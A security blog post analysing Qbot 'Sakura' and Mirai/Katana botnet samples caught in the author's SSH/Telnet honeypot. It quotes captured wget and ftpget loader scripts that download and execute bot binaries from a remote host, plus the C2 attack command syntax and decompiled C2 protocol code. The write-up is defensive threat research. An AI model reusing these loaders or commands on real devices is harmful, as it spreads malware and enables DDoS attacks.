---
description: This blog delves into the world of IoT botnets, exploring how they operate, the vulnerabilities they exploit, and the impact they have on both individuals and organizations.
                It discusses the methods used by attackers to compromise IoT devices, the challenges in securing these devices, and the steps that can be taken to mitigate risks.
                The blog also highlights recent case studies and research findings in the field of IoT security.
---
# Qbot and Mirai *Rabbit-Hole*

## Part 1: Initial Compromise and Qbot Activity

### **Qbot Detection and Analysis**

Today, during my routine checkup on my SSH and Telnet honeypot, I noticed that a binary had been downloaded with the following payload:

```bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://{REDACTED}/x-8.6-.Sakura; chmod +x x-8.6-.Sakura; ./x-8.6-.Sakura; rm -rf x-8.6-.Sakura
```

Here's a breakdown of how this payload works:

1. The script tries to navigate to multiple directories (/tmp, /var/run, /mnt, /root) in sequence. This is often a tactic to ensure that it ends up in a directory where it can safely download and execute the malicious binary.

2. It uses `wget` to download a file (x-8.6-.Sakura) from a remote server.

3. It then uses `chmod +x` in order to make the binary executable.

4. Finally it runs the binary and removes the binary.


The IP hosting the binary resolves to a data centre in the UK called Dolphinhost.

I checked if the binary was stripped of function names (which would make my life harder when reversing it), and it wasn't! This is common among those inexperienced with malware development. I then checked the strings present in the binary and found traits of an open-source Qbot botnet called "Sakura." This helped immensely, as the code is open-source, and I didn't have to reverse it at all.

I then used tria(.)ge to perform some dynamic analysis.

After checking the network activity for the binary, I found that it connects to the C2 server on port 12345. I used PuTTY to connect and see what the C2 server was sending to clients. Upon connecting, I received a simple message saying "PING". I checked the source for the C2 server and could see that it expects the response "PONG" (who would've guessed?). This is used by the C2 to check if the bots are alive and responsive.

About two minutes after exchanging "PONG" with the server, I received the following message:

```
! VSE {REDACTED} 22 30 32 9999 10
```

This was a command sent to all bots, instructing them to launch an attack on an IP.

The command is parsed as follows:

```
! {Type of attack} {IP to attack} {Port to attack} {Time to attack for} {Netmask for spoofed IP} {Packet size} {Send interval}
```

The IP resolves to a server in Vietnam with port 22 open.

Soon after, I received the following message:

```
! STOP
```

And then:

```
! TCP {REDACTED} 22 30 32 9999 10
```

### **Mirai Detection and Analysis**

Around 3 hours later, I attempted to find the port for the C2 control panel and enumerate other hosted binaries. However, port 12345 was closed, and the web server was no longer active. After a quick port scan, I noticed that port 21 (FTP) had been opened.

When I connected using the anonymous FTP account, I found multiple files named `k03ldc` with each file corresponding to a different CPU architecture as the file extension. There was also a file called `ohshit1.sh`, the file contained a loader script for binaries that weren't present on the FTP server or the web server. My guess is that this person is inexperienced and trying out different botnet sources (and being rather messy while doing so).

The loader script looks as follows:

```bash
ulimit -n 1024
cp /bin/busybox /tmp/
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 {REDACTED} boatnet.x86 boatnet.x86; cat boatnet.x86 >WTF; chmod +x *; ./WTF
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 {REDACTED} boatnet.mips boatnet.mips; cat boatnet.mips >WTF; chmod +x *; ./WTF
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 {REDACTED} boatnet.arc boatnet.arc; cat boatnet.arc >WTF; chmod +x *; ./WTF
```

Here's a breakdown of how this payload works:

1. First it raises the limit of open file descriptors (in order to allow the bot to make more connections / requests)

2. It then copies busybox from /bin into /tmp

3. Then it uses the `ftpget` command to try and retrive `boatnet.{architecture}` from the server using the anonymous login

4. It then copies the contents of the retrieved binary into a new binary called `WTF`

5. Finally it makes the `WTF` binary executable with `chmod +x` and runs the binary.

With a quick Google search on "boatnet.mips" and "k03ldc," I discovered that both are associated with Mirai botnet sources (more details available online).

### **Conclusion and Actions Taken**

Later on I went to look at the FTP server to see if anything had changed but it seemed the server was offline.

Its a shame I couldn't get anymore info about the server or the operator but I enjoyed researching what I could.

After completing this research, I submitted an abuse report to Dolphinhost.net and reported the IP on the IP Abuse DB to help others protect their infrastructure.

This is my first write-up so please feel free to give me advice and criticize my work.

  

## Part 2:  Further Analysis and Katana Mirai Variant

### **FTP Server Reactivated**

Two days after my first post, I took another look at the IP to see if anything had changed, and to my surprise, it was back up!

One Nmap scan later, it showed that ports 21 (FTP), 22 (SSH), 80 (HTTP), and 3309 (MySQL) were open. Connecting to the FTP server once again with anonymous credentials, I saw a new set of binaries!

![Part2_FTP.png](https://demo.sudo404.xyz/blogs/img/Part2_FTP.png)

###  **Analysis of New Binaries**

After downloading all the files to my Linux box, I ran `file *` to check each for stripped information. One of the files, yet again, was not stripped of anything and even had debug information!? (I’m really starting to question our operator.)

When running dynamic analysis on tria(.)ge, it showed the C2 server IP being resolved from a domain. Most, if not all, Mirai servers use hard-coded domains instead of hard-coded IPs. This is so that if the C2 server gets shut down (or goes down for other reasons), all the operator has to do is change the IP the domain points to, and all the infected devices will reconnect.

The program attempts to connect to port `60195` on the C2. Unfortunately, the port was closed (or the C2 server wasn’t being hosted), so I could not do any further investigation there.

During the dynamic analysis I noticed the binary also outputs "xXxSlicexXxxVEGA" when executed (I will talk more about this later)

![Part2_Dynamic.png](https://demo.sudo404.xyz/blogs/img/Part2_Dynamic.png)

Digging around in the binary using Ghidra (a reverse engineering tool designed by the NSA), I worked out how the program would communicate with the C2.

1. Initial 4-Byte Data

```c
send(fd_serv,&DAT_0001d8e8,4,0x4000);
```
 
The program sends 4 bytes from the memory location `DAT_0001d8e8` to the C2.

This likely serves as an initial handshake or identifier to inform the C2 server that this device is connecting.

2. A Single Byte of Data

```c
send(fd_serv,local_2a,1,0x4000);
```

The variable `local_2a` is a 2-byte array (`ushort local_2a[3];`), but only 1 byte is sent.

This byte is likely used to indicate the length of the following data or a flag for authentication.

3. Additional Data

```c
if ((byte)local_2a[0] != 0) {
	send(fd_serv, auStack_98, (uint)(byte)local_2a[0], 0x4000);
}
```

If `local_2a[0]` is not zero, the client sends `auStack_98`, which is a 32-byte buffer.

This buffer is initialized earlier:

```c
util_zero(auStack_98, 0x20);

if ((param_1 == 2) && (iVar3 = util_strlen(param_2[1]), iVar3 < 0x20)) {
	util_strcpy(auStack_98, param_2[1]);
}
```

This suggests that if a command-line argument is provided (`param_2[1]`), it is copied into `auStack_98`.

This is most likely an identifier for how the device was exploited (e.g., via SSH brute force, Telnet brute force, etc.).

For example, if a device had been exploited via SSH brute force, the binary may be run with 'ssh' as the argument.

This would help the operator determine which methods are working well for exploiting new devices.

4. Periodic Keep-Alive Message

```c
iVar3 = local_59c % 6;
local_59c = local_59c + 1;
local_2a[0] = 0;
if (iVar3 == 0) {
	send(fd_serv, local_2a, 2, 0x4000);
}
```

Every 6th iteration, the client sends 2 bytes (`local_2a[0] = 0`).

This is likely a keep-alive message to let the server know the client is still online (like the PING and PONG from the previous binary's).

### **The `ohsitsvegawellrip1.sh` Loader and Katana Mirai**

Also present on the FTP server was a new loader called `ohsitsvegawellrip1.sh`, this contained a payload template similar to the `boatnet.sh` loader from the first post, except this cone includes an interesting argument for the executed binary.

The binary grabbed from the FTP server is executed with `ssh.vegasec` as the argument, further confirming the de-compiled code. This also gives us a name to investigate: "vegasec".
This also ties into the outputted string from running the binary in tria(.)ge ("xXxSlicexXxxVEGA")

After a quick Google search, I came across a [brief write-up](https://otx.alienvault.com/pulse/5f9a7c97880d6865be8aa202) on the Katana Mirai variant—yet another open-source botnet on GitHub that our operator has chosen.

The C2 server listens for bots on port `60195` and for admin panel connections on port `44115`. All usernames and passwords for admin panel logins are stored in a MySQL database (like most Mirai variants).

```bash
ulimit -n 1024
cp /bin/busybox /tmp/

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 {REDACTED} KKveTTgaAAsecNNaaaa.x86 KKveTTgaAAsecNNaaaa.x86; cat KKveTTgaAAsecNNaaaa.x86 > loudscream; chmod +x *; ./loudscream ssh.vegasec
```

The loader functions the same as the Mirai loader from Part 1 but with different file and variable names.

https://github.com/saintly2k/katana

https://www.virustotal.com/graph/ge70ec3f6457542e6ad85ce4fd2fcac2c066f8c0ce7b74ad59260162ae9730d03